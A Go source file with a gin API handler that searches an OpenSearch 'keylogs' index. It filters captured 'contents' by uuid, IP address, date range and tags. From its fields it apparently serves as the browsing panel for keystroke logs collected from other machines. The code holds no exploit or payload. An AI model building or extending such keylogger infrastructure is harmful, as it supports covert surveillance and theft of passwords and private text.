package api

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	opensearch "github.com/opensearch-project/opensearch-go/v2"
)

var (
	opensearchOnce   sync.Once
	opensearchClient *opensearch.Client
	opensearchErr    error
)

func getOpensearchClient() (*opensearch.Client, error) {
	opensearchOnce.Do(func() {
		addresses := splitCommaEnv("OPENSEARCH_HOSTS")
		if len(addresses) == 0 {
			address := strings.TrimSpace(os.Getenv("OPENSEARCH_URL"))
			if address == "" {
				address = "http://opensearch:9200"
			}
			addresses = []string{address}
		}

		opensearchClient, opensearchErr = opensearch.NewClient(opensearch.Config{
			Addresses: addresses,
			Username:  strings.TrimSpace(os.Getenv("OPENSEARCH_USERNAME")),
			Password:  os.Getenv("OPENSEARCH_PASSWORD"),
			Transport: &http.Transport{
				Proxy:               http.ProxyFromEnvironment,
				MaxIdleConns:        10,
				IdleConnTimeout:     30 * time.Second,
				TLSHandshakeTimeout: 10 * time.Second,
			},
		})
	})
	return opensearchClient, opensearchErr
}

func SearchKeylogsHandler(c *gin.Context) {
	client, err := getOpensearchClient()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create OpenSearch client"})
		return
	}

	index := strings.TrimSpace(os.Getenv("OPENSEARCH_INDEX"))
	if index == "" {
		index = "keylogs"
	}

	q := strings.TrimSpace(c.Query("q"))
	uuid := strings.TrimSpace(c.Query("uuid"))
	ip := strings.TrimSpace(c.Query("ip"))
	start := strings.TrimSpace(c.Query("start"))
	end := strings.TrimSpace(c.Query("end"))
	tagLogic := strings.ToLower(strings.TrimSpace(c.DefaultQuery("tag_logic", "and")))
	if tagLogic != "or" {
		tagLogic = "and"
	}

	limit := parseQueryInt(c, "limit", 50, 1, 500)
	offset := parseQueryInt(c, "offset", 0, 0, 1000000)

	query := buildKeylogQuery(q, uuid, ip, start, end, c.QueryArray("tag"), tagLogic)

	body := map[string]interface{}{
		"from":  offset,
		"size":  limit,
		"query": query,
		"sort": []map[string]interface{}{
			{"created_at": map[string]interface{}{"order": "desc"}},
		},
	}

	var buf bytes.Buffer
	if err := json.NewEncoder(&buf).Encode(body); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to encode search body"})
		return
	}

	ctx, cancel := context.WithTimeout(c.Request.Context(), 10*time.Second)
	defer cancel()

	resp, err := client.Search(
		client.Search.WithContext(ctx),
		client.Search.WithIndex(index),
		client.Search.WithBody(&buf),
		client.Search.WithTrackTotalHits(true),
	)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "OpenSearch query failed"})
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 300 {
		body, _ := io.ReadAll(resp.Body)
		c.JSON(resp.StatusCode, gin.H{"error": "OpenSearch error", "details": string(body)})
		return
	}

	var raw map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&raw); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to decode OpenSearch response"})
		return
	}

	hits := map[string]interface{}{}
	if h, ok := raw["hits"].(map[string]interface{}); ok {
		hits = h
	}

	c.JSON(http.StatusOK, gin.H{
		"took":  raw["took"],
		"total": hits["total"],
		"data":  hits["hits"],
	})
}

func buildKeylogQuery(q, uuid, ip, start, end string, tags []string, tagLogic string) map[string]interface{} {
	must := make([]interface{}, 0)
	filter := make([]interface{}, 0)

	if q != "" {
		must = append(must, map[string]interface{}{
			"simple_query_string": map[string]interface{}{
				"query":            q,
				"fields":           []string{"contents"},
				"default_operator": "and",
			},
		})
	}
	if uuid != "" {
		filter = append(filter, map[string]interface{}{"term": map[string]interface{}{"uuid": uuid}})
	}
	if ip != "" {
		filter = append(filter, map[string]interface{}{"term": map[string]interface{}{"ip": ip}})
	}
	if start != "" || end != "" {
		rng := map[string]interface{}{}
		if start != "" {
			rng["gte"] = start
		}
		if end != "" {
			rng["lte"] = end
		}
		filter = append(filter, map[string]interface{}{
			"range": map[string]interface{}{"created_at": rng},
		})
	}

	if len(tags) > 0 {
		tagQueries := make([]interface{}, 0, len(tags))
		for _, raw := range tags {
			tag := strings.TrimSpace(raw)
			if tag == "" {
				continue
			}
			key, value, hasValue := strings.Cut(tag, ":")
			key = strings.TrimSpace(key)
			value = strings.TrimSpace(value)
			if key == "" {
				continue
			}

			var tagQuery map[string]interface{}
			if hasValue && value != "" {
				tagQuery = map[string]interface{}{
					"nested": map[string]interface{}{
						"path": "tags",
						"query": map[string]interface{}{
							"bool": map[string]interface{}{
								"must": []interface{}{
									map[string]interface{}{"term": map[string]interface{}{"tags.key": key}},
									map[string]interface{}{"term": map[string]interface{}{"tags.value": value}},
								},
							},
						},
					},
				}
			} else {
				tagQuery = map[string]interface{}{
					"nested": map[string]interface{}{
						"path": "tags",
						"query": map[string]interface{}{
							"term": map[string]interface{}{"tags.key": key},
						},
					},
				}
			}
			tagQueries = append(tagQueries, tagQuery)
		}
		if len(tagQueries) > 0 {
			if tagLogic == "or" {
				filter = append(filter, map[string]interface{}{
					"bool": map[string]interface{}{
						"should":               tagQueries,
						"minimum_should_match": 1,
					},
				})
			} else {
				filter = append(filter, map[string]interface{}{
					"bool": map[string]interface{}{
						"must": tagQueries,
					},
				})
			}
		}
	}

	if len(must) == 0 && len(filter) == 0 {
		return map[string]interface{}{"match_all": map[string]interface{}{}}
	}

	boolQuery := map[string]interface{}{}
	if len(must) > 0 {
		boolQuery["must"] = must
	}
	if len(filter) > 0 {
		boolQuery["filter"] = filter
	}
	return map[string]interface{}{"bool": boolQuery}
}

func splitCommaEnv(key string) []string {
	raw := strings.TrimSpace(os.Getenv(key))
	if raw == "" {
		return nil
	}
	parts := strings.Split(raw, ",")
	out := make([]string, 0, len(parts))
	for _, part := range parts {
		p := strings.TrimSpace(part)
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}

func parseQueryInt(c *gin.Context, key string, def, min, max int) int {
	raw := strings.TrimSpace(c.DefaultQuery(key, ""))
	if raw == "" {
		return def
	}
	val, err := strconv.Atoi(raw)
	if err != nil {
		return def
	}
	if val < min {
		return min
	}
	if val > max {
		return max
	}
	return val
}
